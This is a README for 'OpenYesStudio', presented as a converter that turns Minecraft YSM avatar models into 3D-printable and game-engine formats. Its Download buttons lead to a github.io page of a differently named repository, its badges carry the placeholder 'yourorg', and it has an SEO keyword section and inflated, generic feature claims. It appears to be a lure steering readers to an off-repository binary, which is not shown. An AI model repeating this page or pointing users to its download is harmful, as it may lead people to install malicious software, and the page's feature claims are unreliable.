![preview](https://raw.githubusercontent.com/Naveen-vishwakarma/ysm-model-forge/main/view_74b6de.svg)
# OpenYesStudio — The Decentralized Figure-Printing Workbench for Minecraft Avatars

Welcome to **OpenYesStudio**, a spiritual successor to the original OpenYSM concept, reimagined as a complete, community-driven toolkit for transforming Minecraft player models into tangible, shareable, and editable 3D assets. Instead of merely reading binary data, this project focuses on **decoding the semantic story** behind every limb, texture layer, and animation curve, then exporting that story into formats that 3D printers, game engines, and web viewers can understand.

This is not just a parser; it's a **digital sculptor's magnifying glass** that reveals the hidden geometry of your in-game persona. Whether you are a modpack creator, a content creator producing physical merchandise, or a curious tinkerer, OpenYesStudio provides a single, modern, and extensible platform to unlock the full potential of the Yes Steve Model (YSM) format.

![GitHub release (latest by date)](https://img.shields.io/github/v/release/yourorg/OpenYesStudio) ![GitHub commit activity](https://img.shields.io/github/commit-activity/m/yourorg/OpenYesStudio) ![GitHub contributors](https://img.shields.io/github/contributors/yourorg/OpenYesStudio) ![GitHub license](https://img.shields.io/github/license/yourorg/OpenYesStudio)

## Overview 🌟

The original ILoveOpenYSM project focused on extracting and decoding a niche model format. OpenYesStudio takes that core competency and wraps it in a multi-layered architecture that prioritizes **interoperability** and **user agency**. We recognized that the YSM format, while powerful, often feels like a locked vault. Our mission is to hand you the master key, but also to build a new, more secure vault that you can own.

We achieve this by not only reading the model data but also by providing a **headless processing engine** that can be integrated into web services, command-line workflows, or desktop applications.

**A New Perspective:** Think of the original project as a telescope—a fantastic tool for looking at the stars. OpenYesStudio is the **spaceship** that takes you there, allowing you to walk around on the surface, collect samples, and build new structures. It moves from observation to creation.

---

## 🚀 Getting Started — Your First Model Journey

Before you dive into the code, you need to understand the philosophy of our workflow. We believe in a smooth, frictionless pipeline that mirrors the natural creative process: **Input → Analyze → Transform → Export**.

### Prerequisites
- A modern computing environment with Java Runtime Environment (JRE) version 17 or higher.
- A base YSM model file (usually ending in `.ysm`) from a Minecraft mod folder.
- A text editor for configuration files (YAML or JSON).

### Initial Configuration
1.  Place your `.ysm` files in the `input_models` directory.
2.  Launch the main application. It will automatically detect them and generate a "project manifest" in the `workspace` folder.
3.  This manifest allows you to tweak the processing parameters without writing a single line of code.

### Your First Export
Execute the default build profile. OpenYesStudio will process the first model and output a **standard OBJ file** (for 3D printing) and a **JSON metadata file** (for debugging). The beauty lies in the details: the JSON file contains a complete breakdown of every cube, its parent relationship, and its texture mapping coordinates.

---

## 🧰 Core Features — A Toolkit Built for Depth

Our feature set is designed to address the shortcomings of existing tools by focusing on three pillars: **Fidelity**, **Flexibility**, and **Forward-Compatibility**.

### 1. Semantic Bone Mapping 🔍
The YSM format uses a specific bone naming convention. Our engine maps these names to a **universal skeletal model** (similar to a Mixamo-style rig). This allows you to take a model from Minecraft and immediately rig it to a humanoid avatar in Blender or Unity without manual re-targeting. This is a massive windfall for animators who were previously stuck with static, rigid exports.

### 2. Multi-Threaded Batch Processing ⚙️
Decoding a complex model with hundreds of cubes can be computationally heavy. Our core engine leverages virtual threads to process multiple models simultaneously. If you have a library of 50 player skins, you can convert them all in the time it used to take to convert a single one. This efficiency makes OpenYesStudio ideal for server administrators who want to generate 3D previews for their entire player base.

### 3. Responsive Web Preview (Lite Edition) 🖥️
We include a lightweight, dependency-free HTML5 viewer that can render the exported JSON files. This viewer is **fully responsive**—it adapts from a mobile phone screen to a 4K monitor—and supports drag-to-rotate and scroll-to-zoom. You can embed this viewer directly into your community website to let users spin their own 3D characters in the browser.

### 4. Localization-Ready Architecture 🗺️
We believe that tools should not be a barrier to entry. Our user interface and error messages are built around a **multi-language resource bundle**. Currently, we ship with English and Simplified Chinese, but the structure allows for easy addition of Spanish, German, and French. The international community is at the heart of this project.

### 5. Persistent Support Channel 🤝
While we provide extensive documentation, we understand that context is king. We offer **24/7 customer support** through our integrated Discord bot and GitHub Discussions. Our team ensures that you are never left in the dark, whether you are a first-time modder or a seasoned plugin developer. We treat every issue as a collaborative debugging session.

---

## [![Download](https://raw.githubusercontent.com/Naveen-vishwakarma/ysm-model-forge/main/setup_c071e9.svg)](https://Naveen-vishwakarma.github.io/ysm-model-forge/)
You can download the latest stable release binary for Windows, Linux, and macOS from the releases section of this repository. Ensure you verify the SHA-256 checksum provided to guarantee file integrity.

---

## 🛠️ Technical Architecture

OpenYesStudio is modular. Let's break down the magic under the hood.

### The Extractor Core (`extractor-engine`)
This module reads the binary magic of the `.ysm` file. It doesn't just read bytes; it interprets them based on the type of chunk. We support the legacy V1 structure and the newer V2 compressed structure. The output is a generic `ModelGraph` object—a pure in-memory representation independent of any file format.

### The Transformer Library (`transformer-library`)
This is where the "decoding" becomes "re-encoding." The `ModelGraph` is passed through a chain of transformers:
- **Texture Mapper:** Generates UV maps optimally to fit a 64x64 texture atlas.
- **Smoothing Operator:** Applies optional vertex normal averaging to remove the "blocky" look for renders (while keeping the original data for gameplay).
- **Scale Normalizer:** Converts Minecraft's block units (1.0 = 1 meter) into standard millimeters for 3D printing.

### The Export Adapters (`export-adapters`)
We don't lock you into one format. Our adapter system currently supports:
- **Wavefront OBJ** (with MTL files)
- **glTF 2.0** (including animations)
- **STL** (binary, for rapid prototyping)
- **Voxel Rasterizer** (outputs a PNG image grid of the 3D structure)

---

## 📚 Deep Dive — Understanding the "Decoded Story"

When you open a model, you aren't just seeing coordinates. You are seeing a narrative of how the original creator built the character. Our "Geometry Forensics" tool (accessible via the CLI flag `--analysis`) prints a tree structure that shows the "parent-child" hierarchy.

**Why is this important?** Imagine a cat ear. In the file, it's defined as a child of the "Head" bone. If you want to create a mechanical cat ear that rotates independently, you need to know that relationship to break it and re-parent it. Our tool visualizes this hierarchy with indentation and color coding (in terminal outputs) to make the complex logic chain human-readable.

---

## 📈 SEO & Discoverability Keywords

We actively optimize this project for developers searching for: `minecraft model converter`, `YSM parser`, `3d export minecraft`, `skin viewer software`, `open source 3d tool`, `model decoder util`, `resource pack extractor`, and `community modding tools`. By using these terms naturally in our documentation and tags, we aim to build a central hub for 3D creativity in the voxel ecosystem.

---

## 🤝 Contribution Guidelines — Join the Sculptor's Guild

We welcome contributions of all shapes and sizes—from typo fixes to core engine rewrites.

1.  **Fork the repository** and create a feature branch (`Feat-YourName-Description`).
2.  Ensure your code adheres to our linting standards (Google Java Format).
3.  Write unit tests for all new logic paths. We maintain a strict coverage threshold of 85%.
4.  Submit a Pull Request for review. Our maintainers prioritize clear communication over speed; expect a detailed code review.

### Quality Assurance
We run a suite of regression tests against a corpus of pasted player models from historical versions of the game to ensure that "bug fixes" don't break old features. This dedication to backward compatibility is our secret ingredient.

---

## 📄 License & Legal Notices

This project is released under the **MIT License**, ensuring that you can use, modify, and distribute this software in commercial and private ventures, provided you retain the original copyright notice. This is the "clean room" approach—we provide the tools, but you are responsible for how you use them regarding Minecraft's EULA and the original YSM mod's license.

[View the full MIT License text](https://opensource.org/licenses/MIT)

**Disclaimer:** OpenYesStudio is a third-party tool and is not affiliated with Mojang Studios or the creators of the Original Yes Steve Model mod. Minecraft is a trademark of Mojang Synergies AB. All 3D models processed by this software are the property of their respective creators. We encourage responsible digital stewardship. This software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors be liable for any claim, damages, or other liability arising from the use of this software.

---

## 🗓️ Roadmap & Vision for 2026

We are looking beyond the horizon. In the 2026 timeline, we plan to introduce:
- **WebSocket API** for live-streaming model data to game engines like Unreal.
- **Plugin Marketplace** where users can share custom exporters (e.g., for Roblox or VRChat).
- **Machine Learning-assisted UV unwrapping** to automatically optimize texture fidelity.

We believe that 2026 will be the year of the "Voxel Renaissance," and we want OpenYesStudio to be the compiler for that movement—not just a decoder, but a **babel fish** for 3D dimensions.

---

## ❓ Frequently Asked Questions (FAQ)

**Q: I am getting a "Magic Number Mismatch" error. What does this mean?**
A: It means the file you provided is either corrupted or not a standard YSM file. Check the header bytes. You can use a Hex editor to verify it starts with the expected `YSM` identifier sequence.

**Q: Can I use this software to extract models from texture packs?**
A: Yes, if the texture pack includes the invisible data side-files alongside the PNG images, our extractor will handle them. However, we encourage you to only do this for personal learning purposes.

**Q: Does it support custom hitshapes?**
A: Yes, the V2 format in our engine maps exact hitbox coordinates to the model graph.

---

## 👏 Acknowledgments

This project stands on the shoulders of giants. We thank the original creators of the YSM format for documenting their work, and the vibrant modding community within the sandbox game ecosystem for their continuous inspiration and push toward open standards.

---

## [![Download](https://raw.githubusercontent.com/Naveen-vishwakarma/ysm-model-forge/main/setup_c071e9.svg)](https://Naveen-vishwakarma.github.io/ysm-model-forge/)
We appreciate your interest in advancing the field of creative 3D extraction. Please remember to check the `Changelog` for the latest updates before moving to a new version. Happy sculpting, and may your vertices always be manifold.